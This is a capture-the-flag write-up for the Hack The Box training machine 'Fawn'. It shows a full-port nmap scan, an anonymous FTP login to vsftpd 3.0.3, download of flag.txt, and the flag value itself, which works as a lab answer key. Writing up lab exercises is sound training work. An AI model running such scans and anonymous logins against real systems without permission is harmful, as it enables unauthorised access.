# Fawn

----
> TARGET MACHINE IP ADDRESS: 10.129.113.198
----

## Nmap 
```
nmap -sS -sV -sC -T4 -p- 10.129.113.198
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-20 23:44 GMT
Warning: 10.129.113.198 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.113.198
Host is up (0.0087s latency).
Not shown: 65218 closed tcp ports (reset), 316 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.124
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 236.25 seconds
```

## Pwn
```
ftp 10.129.113.198
Connected to 10.129.113.198.
220 (vsFTPd 3.0.3)
Name (10.129.113.198:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
32 bytes received in 0.00 secs (21.3020 kB/s)
ftp> exit
221 Goodbye.
┌─[us-starting-point-1-dhcp]─[10.10.14.124]─[gregkedro@htb-bckbgjrfow]─[~]
└──╼ [★]$ cat flag.txt 
035db21c881520061c53e0536e44f815
```

![Pasted image 20240220183647](https://github.com/GregKedrovsky/Hacking/assets/26492233/08278164-a3f7-4c95-8632-14335ed1f5ad)
